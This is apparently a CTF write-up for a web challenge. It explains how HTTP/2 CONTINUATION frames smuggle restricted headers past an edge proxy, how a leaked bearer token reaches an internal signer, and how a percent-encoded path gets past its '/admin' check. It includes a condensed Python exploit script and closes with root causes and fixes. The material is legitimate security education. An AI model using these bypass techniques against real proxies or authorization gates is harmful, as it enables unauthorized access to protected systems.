---
title: "Cassandra Fintech — cassandra-edge/2.3.1 (IFSCR CTF)"
description: "The edge proxy enforces its restricted-header rules only while decoding the primary HEADERS frame. By padding the header block so the sensitive headers fall into CONTINUATION frames, the…"
event: "isfcr"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CTF 2026","web"]
date: "2026-10-11"
teammate: true
source: "isfcr/writeups/cassandra.md"
---

**Target:** `0.cloud.chals.io:30152` (HTTP/2 over TLS, self-signed cert)
**Flag:** `isfcr{h2_continuation_smuggling_is_the_new_black}`

---

## TL;DR

The edge proxy enforces its restricted-header rules only while decoding the
primary `HEADERS` frame. By padding the header block so the sensitive headers
fall into `CONTINUATION` frames, the filter is bypassed. The backend then:

1. Accepts a signature obtained from the internal signer (`POST /internal/sign`)
   whose path policy is a *literal substring* check for `/admin`.
2. Resolves `/admin/flag` from a path that normalizes to it (`unquote` +
   `normpath`), while verifying the HMAC over the **raw** `X-Signed-Path`.

Sign `"/api/../%61dmin/flag"` (no literal `/admin`, starts with `/api/`), send it
as `X-Signed-Path` on `GET /admin/flag`, and the gate lets you through.

---

## 1. Recon

The root page advertises a "status API" behind `cassandra-edge/2.3.1` and hard-claims
that admin/internal routes are locked down.

```
$ curl -sk --http2 https://0.cloud.chals.io:30152/
HTTP/2 200
server: cassandra-edge/2.3.1
... welcome ... /api/openapi.json /api/changelog ...
```

`/api/openapi.json`:

```json
"x-internal-hint": "Admin/internal routes are reachable only from the internal
monitor. Internal probes carry an opaque bearer token; administrative actions
additionally require a rotating HMAC signature."
```

`/api/changelog` is the roadmap to the bug:

```
2026-08-19  HPACK front-end rewritten. Restricted-header enforcement moved into
            the primary HEADERS-frame decode path per RFC 7540 §4.3 (a compliant
            client sends its whole header block in one frame). Continuation frames
            retain the previous fast path so streaming uploads are unaffected.
2026-09-01  hpack dynamic table sized at 4096 to match origin.
2026-09-11  Internal monitor cadence reduced to every 3 seconds. Bearer rotated.
2026-09-18  Signing endpoint hardened: /admin paths may no longer be signed by the
            internal signer. The rule is applied as a literal string check against
            the caller-supplied path.
2026-09-22  Admin route path normalization now uses urllib.parse.unquote +
            os.path.normpath for defence in depth. Verified: legacy signed paths
            still verify against the RAW X-Signed-Path header value.
2026-09-25  Public /api/notes bulletin board retained as a debugging aid.
```

### The noise

The instance is shared and heavily loaded; responses are frequently shuffled
between clients (you'll get another client's `404`/`401`). The reliable trick is
to **send many identical requests on one connection and take the mode**.

- `GET /api/health` → `{"status":"ok","ts":...}`
- `GET /api/status` → `{"region":..., "monitor_seen":...}`
- `GET /admin/flag` → `401 {"detail":"missing X-Admin-Sig / X-Admin-Ts / X-Signed-Path"}`

---

## 2. Restricted-header bypass (HTTP/2 CONTINUATION)

Sending a restricted header in the primary HEADERS frame:

```
HTTP/2 400
restricted header: x-admin-sig
```

The following header names are filtered: `x-admin-sig`, `x-admin-ts`,
`x-signed-path`, `x-internal-token`, `x-internal-auth`.

The filter is *only* applied to the HEADERS frame. To get a restricted header
into a CONTINUATION frame, prepend an incompressible padding header large enough
to push the real header past the 16 KiB `SETTINGS_MAX_FRAME_SIZE` boundary. HPACK
encodes in order, so the sensitive header is emitted inside a CONTINUATION frame
while `HEADERS` carries only the padding.

```python
PAD = ''.join(random.choice(string.ascii_letters + string.digits)
              for _ in range(50000))          # poor Huffman compression

headers = [(":method","GET"), (":path","/admin/flag"),
           (":scheme","https"), (":authority","0.cloud.chals.io:30152"),
           ("x-pad", PAD),                    # fills the HEADERS frame
           ("x-admin-ts", ts),
           ("x-signed-path", signed_path),    # -> CONTINUATION frame
           ("x-admin-sig", sig)]
```

Proof the smuggled `X-Admin-Sig` reaches the backend gate:

```
GET /api/health + smuggled x-admin-sig -> 401 {"detail":"bad signature"}
```

A small block still returns `400 restricted header`.

---

## 3. Credential leak: the live request capture

`/api/notes` is a bulletin board, but `/api/notes/201` is a **live capture of raw
HTTP/1.1 requests** reaching the service:

```
GET /api/status HTTP/1.1
Host: 127.0.0.1:8443
authorization: Bearer dev_bot_bearer_do_not_ship
user-agent: cassandra-monitor/1.0
x-monitor-cycle: 1791682955

GET /admin/sign HTTP/1.1
Host: 0.cloud.chals.io
x-internal-auth: probe
x-internal-token: probe
x-signed-path: /x/flag
...
```

This leaks the internal monitor's bearer token (`dev_bot_bearer_do_not_ship`) and
hints at the signer endpoint. (`/admin/sign` itself returns 404; the real route is
`/internal/sign`.)

Fuzzing the signer with the leaked bearer:

```
POST /internal/sign  (no body)                         -> 400 unsupported method
POST /internal/sign  form body                         -> 400 bad json
POST /internal/sign  {"method":"GET","path":"/x/flag"} -> 403 path must start with /api/
POST /internal/sign  {"method":"GET","path":"/api/health","ts":<n>} -> 200 {"sig":...}
```

So the signer is `POST /internal/sign`:

- Requires `Authorization: Bearer dev_bot_bearer_do_not_ship`
- Requires `Content-Type: application/json`
- Body: `{"method": "...", "path": "...", "ts": <unix seconds>}`
- Policy: `path` must start with `/api/` **and** must not contain the literal
  substring `/admin`.

Response:

```json
{"sig":"<hex hmac>","signed_message":"GET /api/../%61dmin/flag 1791689160"}
```

---

## 4. Bypassing the signer policy + gate

The signer's `/admin` check is a **literal substring** test on the raw caller
path. Percent-encoding `/api/../%61dmin/flag`:

- Starts with `/api/` ✅
- Does **not** contain the substring `/admin` ✅
- `unquote("…%61dmin…")` → `/api/../admin/flag`
- `normpath(...)` → `/admin/flag` ✅

Get the signature:

```
POST /internal/sign
Authorization: Bearer dev_bot_bearer_do_not_ship
Content-Type: application/json

{"method":"GET","path":"/api/../%61dmin/flag","ts":<now>}
```

The gate's behaviour (observed):

- It resolves `X-Signed-Path` with `unquote` + `normpath` and requires the result
  to match the request's route:
  `401 {"detail":"signed_path resolves to '/api/health', not /admin/flag"}`
- It verifies the HMAC over the **raw** `X-Signed-Path` value.

So send `GET /admin/flag` with the three restricted headers smuggled through
CONTINUATION frames:

```
GET /admin/flag
X-Signed-Path: /api/../%61dmin/flag
X-Admin-Ts:    <now>
X-Admin-Sig:   <sig>
```

Result:

```json
{"flag":"isfcr{h2_continuation_smuggling_is_the_new_black}"}
```

The same works with other encodings, e.g. `/api/%2e%2e/%61dmin/flag`.

---

## 5. Full exploit (condensed)

```python
import json, time, re, random, string
from h2batch import batch   # raw HTTP/2 batch client (h2 + TLS)

TOKEN = "dev_bot_bearer_do_not_ship"
AUTH  = [("authorization", "Bearer " + TOKEN),
         ("content-type", "application/json")]
PAD   = ''.join(random.choice(string.ascii_letters + string.digits)
                for _ in range(30000))
S = lambda real: [("x-pad", PAD)] + real   # force restricted hdrs into CONTINUATION

def get_sig(path, ts):
    body = json.dumps({"method": "GET", "path": path, "ts": ts}).encode()
    d = batch("/internal/sign", AUTH, n=12, method="POST", body=body)
    for (code, b), _ in d.most_common(40):
        if code == 200:
            m = re.search(rb'"sig":"([0-9a-fA-F]+)"', b)
            if m:
                return m.group(1).decode()

P  = "/api/../%61dmin/flag"          # starts with /api/, no literal "/admin"
ts = int(time.time())
sig = get_sig(P, ts)

resp = batch("/admin/flag",
             S([("x-admin-ts", str(ts)),
                ("x-signed-path", P),
                ("x-admin-sig", sig)]),
             n=14)
print(resp.most_common(1))
# -> (200, b'{"flag":"isfcr{h2_continuation_smuggling_is_the_new_black}"}')
```

Supporting files in this directory:

| File | Purpose |
|------|---------|
| `h2batch.py`     | Raw HTTP/2 client; sends N identical requests on one connection and returns the response distribution (noise-resistant oracle). |
| `cont_test.py` / `ct.py` | Demonstrates the HEADERS → CONTINUATION restricted-header bypass (`400` vs `401 bad signature`). |
| `hdrprobe.py`    | Enumerates which header names trigger `restricted header`. |
| `sign*.py`       | Signer discovery and policy probing. |
| `exploit5.py`    | End-to-end exploit. |

---

## 6. Root causes

1. **Inconsistent HTTP/2 header validation.** Restricted-header enforcement lived
   only in the HEADERS-frame path; CONTINUATION frames bypassed it. Validate the
   *reassembled* header block after `END_HEADERS`, not per frame.
2. **Secret leak via debug endpoints.** A "debugging aid" exposed raw internal
   requests, including the monitor bearer and signer usage.
3. **Path-policy bypass via encoding.** A literal `"/admin"` substring check is
   defeated by percent-encoding (`%61dmin`). Compare **normalized** paths, and
   sign/verify the **same canonical value**.
4. **Mixed canonicalization in verification.** Routing normalized the path while
   the HMAC verified the raw header, letting a signed non-admin string authorize
   an admin route. Canonicalize once and use that value everywhere.
